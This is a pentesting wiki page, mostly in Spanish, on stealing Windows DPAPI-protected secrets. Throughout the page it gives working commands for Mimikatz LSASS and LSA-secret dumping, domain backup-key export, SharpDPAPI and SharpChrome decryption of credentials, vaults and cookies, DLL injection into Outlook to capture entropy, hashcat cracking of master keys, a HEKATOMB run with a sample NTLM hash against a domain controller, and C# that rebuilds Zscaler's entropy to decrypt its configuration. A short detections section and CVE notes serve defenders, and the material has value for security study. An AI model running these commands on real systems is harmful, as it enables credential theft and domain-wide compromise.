# DPAPI - Extracción de contraseñas

{{#include ../../banners/hacktricks-training.md}}



## ¿Qué es DPAPI

La API de Protección de Datos (DPAPI) se utiliza principalmente en el sistema operativo Windows para el **cifrado simétrico de claves privadas asimétricas**, aprovechando ya sean secretos de usuario o del sistema como una fuente significativa de entropía. Este enfoque simplifica el cifrado para los desarrolladores al permitirles cifrar datos usando una clave derivada de los secretos de inicio de sesión del usuario o, para el cifrado del sistema, los secretos de autenticación de dominio del sistema, evitando así que los desarrolladores tengan que gestionar la protección de la clave de cifrado ellos mismos.

La forma más común de usar DPAPI es mediante las funciones **`CryptProtectData` y `CryptUnprotectData`**, que permiten a las aplicaciones cifrar y descifrar datos de forma segura con la sesión del proceso que está actualmente iniciada. Esto significa que los datos cifrados solo pueden ser descifrados por el mismo usuario o sistema que los cifró.

Además, estas funciones aceptan también un **`entropy` parameter** que se usará durante el cifrado y descifrado; por lo tanto, para descifrar algo cifrado usando este parámetro, debes proporcionar el mismo valor de entropy que se usó durante el cifrado.

### Generación de la clave de usuario

DPAPI genera una clave única (llamada **`pre-key`**) para cada usuario basada en sus credenciales. Esta clave se deriva de la contraseña del usuario y otros factores; el algoritmo depende del tipo de usuario pero termina siendo un SHA1. Por ejemplo, para usuarios de dominio, **depende del NTLM hash del usuario**.

Esto es especialmente interesante porque si un atacante puede obtener el hash de la contraseña del usuario, puede:

- **Descifrar cualquier dato que haya sido cifrado usando DPAPI** con la clave de ese usuario sin necesitar contactar ninguna API
- Intentar **crackear la contraseña** de forma offline intentando generar la clave DPAPI válida

Además, cada vez que un usuario cifra datos usando DPAPI, se genera una nueva **master key**. Esta master key es la que realmente se usa para cifrar los datos. A cada master key se le asigna un **GUID** (Identificador Único Global) que la identifica.

Las master keys se almacenan en el directorio **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**, donde `{SID}` es el Identificador de Seguridad de ese usuario. La master key se almacena cifrada por la **`pre-key`** del usuario y también por una **domain backup key** para recuperación (por lo que la misma clave se almacena cifrada 2 veces con 2 contraseñas diferentes).

Ten en cuenta que la **domain key usada para cifrar la master key está en los domain controllers y nunca cambia**, así que si un atacante tiene acceso al domain controller, puede recuperar la domain backup key y descifrar las master keys de todos los usuarios del dominio.

Los blobs cifrados contienen el **GUID de la master key** que se usó para cifrar los datos dentro de sus cabeceras.

> [!TIP]
> Los blobs cifrados por DPAPI comienzan con **`01 00 00 00`**

Encontrar claves maestras:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
This is what a bunch of Master Keys of a user will looks like:

![](<../../images/image (1121).png>)

### Machine/System key generation

This is key used for the machine to encrypt data. It's based on the **DPAPI_SYSTEM LSA secret**, which is a special key that only the SYSTEM user can access. This key is used to encrypt data that needs to be accessible by the system itself, such as machine-level credentials or system-wide secrets.

Note that these keys **don't have a domain backup** so they are only accesisble locally:

- **Mimikatz** can access it dumping LSA secrets using the command: `mimikatz lsadump::secrets`
- The secret is stored inside the registry, so an administrator could **modify the DACL permissions to access it**. The registry path is: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`


### Protected Data by DPAPI

Among the personal data protected by DPAPI are:

- Windows creds
- Internet Explorer and Google Chrome's passwords and auto-completion data
- E-mail and internal FTP account passwords for applications like Outlook and Windows Mail
- Passwords for shared folders, resources, wireless networks, and Windows Vault, including encryption keys
- Passwords for remote desktop connections, .NET Passport, and private keys for various encryption and authentication purposes
- Network passwords managed by Credential Manager and personal data in applications using CryptProtectData, such as Skype, MSN messenger, and more
- Encrypted blobs inside the register
- ...

System protected data includes:
- Wifi passwords
- Scheduled task passwords
- ...

### Master key extraction options

- If the user has domain admin privileges, they can access the **domain backup key** to decrypt all user master keys in the domain:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Con privilegios de administrador local, es posible **acceder a la memoria de LSASS** para extraer las claves maestras de DPAPI de todos los usuarios conectados y la clave SYSTEM.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Si el usuario tiene privilegios de administrador local, puede acceder al **DPAPI_SYSTEM LSA secret** para descifrar las claves maestras de la máquina:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- Si se conoce la contraseña o el hash NTLM del usuario, puedes **descifrar directamente las claves maestras del usuario**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Si estás dentro de una sesión como el usuario, es posible pedirle al DC la **backup key to decrypt the master keys using RPC**. Si eres local admin y el usuario tiene la sesión iniciada, podrías **steal his session token** para esto:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Listar Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Acceder a datos cifrados por DPAPI

### Buscar datos cifrados por DPAPI

Los **archivos protegidos** de usuarios comunes están en:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Check also changing `\Roaming\` to `\Local\` in the above paths.

Ejemplos de enumeración:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) puede encontrar blobs cifrados DPAPI en el sistema de archivos, el registro y blobs B64:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Ten en cuenta que [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (del mismo repo) puede usarse para descifrar, usando DPAPI, datos sensibles como cookies.

### Claves de acceso y datos

- **Usa SharpDPAPI** para obtener credenciales desde archivos cifrados con DPAPI de la sesión actual:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Obtener credentials info** como los datos cifrados y el guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Access masterkeys**:

Descifrar un masterkey de un usuario que solicita la **domain backup key** usando RPC:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
La herramienta **SharpDPAPI** también admite estos argumentos para el descifrado de la masterkey (fíjate cómo es posible usar `/rpc` para obtener la clave de respaldo del dominio, `/password` para usar una contraseña en texto plano, o `/pvk` para especificar un archivo de clave privada de dominio DPAPI...):
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Descifrar datos usando una masterkey**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
La herramienta **SharpDPAPI** también admite estos argumentos para el descifrado de `credentials|vaults|rdg|keepass|triage|blob|ps` (tenga en cuenta que es posible usar `/rpc` para obtener la clave de respaldo del dominio, `/password` para usar una contraseña en texto plano, `/pvk` para especificar un archivo de clave privada de dominio DPAPI, `/unprotect` para usar la sesión del usuario actual...):
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Descifrar algunos datos usando la **sesión del usuario actual**:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---
### Manejo de la entropía opcional ("entropía de terceros")

Algunas aplicaciones pasan un valor adicional de **entropía** a `CryptProtectData`. Sin este valor no es posible descifrar el blob, incluso si se conoce la clave maestra correcta. Por lo tanto, obtener la entropía es esencial cuando se atacan credenciales protegidas de esta manera (p. ej. Microsoft Outlook, algunos clientes VPN).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) es una DLL de modo usuario que hooks las funciones DPAPI dentro del proceso objetivo y registra de forma transparente cualquier entropía opcional que se suministre. Ejecutar EntropyCapture en modo **DLL-injection** contra procesos como `outlook.exe` o `vpnclient.exe` generará un archivo que mapea cada buffer de entropía con el proceso llamante y el blob. La entropía capturada puede luego ser suministrada a **SharpDPAPI** (`/entropy:`) o **Mimikatz** (`/entropy:<file>`) para descifrar los datos.
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Descifrado de masterkeys sin conexión (Hashcat & DPAPISnoop)

Microsoft introdujo un formato de masterkey **context 3** a partir de Windows 10 v1607 (2016). `hashcat` v6.2.6 (diciembre de 2023) añadió los hash-modes **22100** (DPAPI masterkey v1 context ), **22101** (context 1) y **22102** (context 3), permitiendo el cracking acelerado por GPU de contraseñas de usuario directamente desde el archivo masterkey. Por tanto, los atacantes pueden realizar ataques word-list o brute-force sin interactuar con el sistema objetivo.

`DPAPISnoop` (2024) automatiza el proceso:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
La herramienta también puede analizar los Credential and Vault blobs, descifrarlos con cracked keys y exportar cleartext passwords.

### Acceder a datos de otra máquina

En **SharpDPAPI and SharpChrome** puedes indicar la opción **`/server:HOST`** para acceder a los datos de una máquina remota. Por supuesto necesitas poder acceder a esa máquina y en el siguiente ejemplo se supone que la **clave de cifrado de respaldo del dominio es conocida**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Otras herramientas

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) es una herramienta que automatiza la extracción de todos los usuarios y equipos del directorio LDAP y la extracción de la clave de respaldo del domain controller a través de RPC. El script luego resolverá todas las direcciones IP de los equipos y ejecutará smbclient en todos los equipos para recuperar todos los blobs DPAPI de todos los usuarios y descifrar todo con la clave de respaldo del dominio.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Con la lista de equipos extraída del LDAP puedes encontrar cada subred incluso si no las conocías!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) puede volcar secretos protegidos por DPAPI automáticamente. El lanzamiento 2.x introdujo:

* Recolección paralela de blobs desde cientos de hosts
* Análisis de masterkeys de **context 3** e integración automática con cracking via Hashcat
* Soporte para cookies cifradas "App-Bound" de Chrome (ver sección siguiente)
* Un nuevo modo **`--snapshot`** para sondear endpoints repetidamente y diferenciar blobs recién creados

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) es un parser en C# para archivos masterkey/credential/vault que puede generar formatos para Hashcat/JtR y opcionalmente invocar cracking automáticamente. Soporta completamente los formatos de masterkey de máquina y de usuario hasta Windows 11 24H1.


## Detecciones comunes

- Acceso a archivos en `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` y otros directorios relacionados con DPAPI.
- Especialmente desde un recurso compartido de red como **C$** o **ADMIN$**.
- Uso de **Mimikatz**, **SharpDPAPI** u herramientas similares para acceder a la memoria de LSASS o volcar masterkeys.
- Evento **4662**: *Se realizó una operación sobre un objeto* – puede correlacionarse con el acceso al objeto **`BCKUPKEY`**.
- Evento **4673/4674** cuando un proceso solicita *SeTrustedCredManAccessPrivilege* (Credential Manager)

---
### Vulnerabilidades y cambios en el ecosistema 2023-2025

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (noviembre de 2023). Un atacante con acceso a la red podría engañar a un miembro del dominio para que recuperara una clave de respaldo DPAPI maliciosa, permitiendo el descifrado de masterkeys de usuario. Corregido en la actualización acumulativa de noviembre de 2023 – los administradores deben asegurarse de que los DCs y las estaciones de trabajo estén completamente parchadas.
* **Chrome 127 “App-Bound” cookie encryption** (julio de 2024) reemplazó la protección heredada basada únicamente en DPAPI por una clave adicional almacenada en el **Credential Manager** del usuario. El descifrado offline de cookies ahora requiere tanto la masterkey de DPAPI como la **app-bound key envuelta en GCM**. SharpChrome v2.3 y DonPAPI 2.x son capaces de recuperar la clave adicional cuando se ejecutan con contexto de usuario.


### Case Study: Zscaler Client Connector – Custom Entropy Derived From SID

Zscaler Client Connector almacena varios archivos de configuración en `C:\ProgramData\Zscaler` (p. ej. `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Cada archivo está cifrado con **DPAPI (Machine scope)** pero el proveedor suministra **custom entropy** que se *calcula en tiempo de ejecución* en lugar de almacenarse en disco.

La entropía se reconstruye a partir de dos elementos:

1. Un secreto hard-coded incrustado dentro de `ZSACredentialProvider.dll`.
2. El **SID** de la cuenta de Windows a la que pertenece la configuración.

El algoritmo implementado por la DLL es equivalente a:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
Debido a que el secreto está embebido en una DLL que puede leerse desde el disco, **cualquier atacante local con privilegios SYSTEM puede regenerar la entropy para cualquier SID** y descifrar los blobs offline:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
El descifrado produce la configuración JSON completa, incluyendo cada **device posture check** y su valor esperado — información que es muy valiosa al intentar omitir comprobaciones del lado del cliente.

> TIP: los otros artefactos cifrados (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) están protegidos con DPAPI **sin** entropía (`16` bytes cero). Por lo tanto, pueden descifrarse directamente con `ProtectedData.Unprotect` una vez que se obtienen privilegios SYSTEM.

## Referencias

- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)

- [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [https://github.com/Leftp/DPAPISnoop](https://github.com/Leftp/DPAPISnoop)
- [https://pypi.org/project/donpapi/2.0.0/](https://pypi.org/project/donpapi/2.0.0/)

{{#include ../../banners/hacktricks-training.md}}
